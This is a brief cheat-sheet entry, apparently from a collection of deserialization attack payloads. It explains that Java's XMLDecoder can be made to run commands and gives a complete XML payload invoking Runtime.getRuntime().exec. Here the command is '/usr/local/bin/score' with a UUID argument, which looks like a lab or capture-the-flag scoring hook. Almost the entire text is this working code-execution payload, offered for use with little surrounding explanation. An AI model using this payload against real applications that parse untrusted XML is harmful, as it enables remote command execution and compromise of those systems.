#### XML Decoder

You can embed an ‘exec’ call into a java.RunTime object call if using XMLDecoder.
```XML
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
    <object class="java.lang.Runtime" method="getRuntime">
        <void method="exec">
            <array class="java.lang.String" length="2">
                <void index="0">
                    <string>/usr/local/bin/score</string>
                </void>
                <void index="1">
                    <string>UUID</string>
                </void>
            </array>
        </void>
    </object>
</java>
```
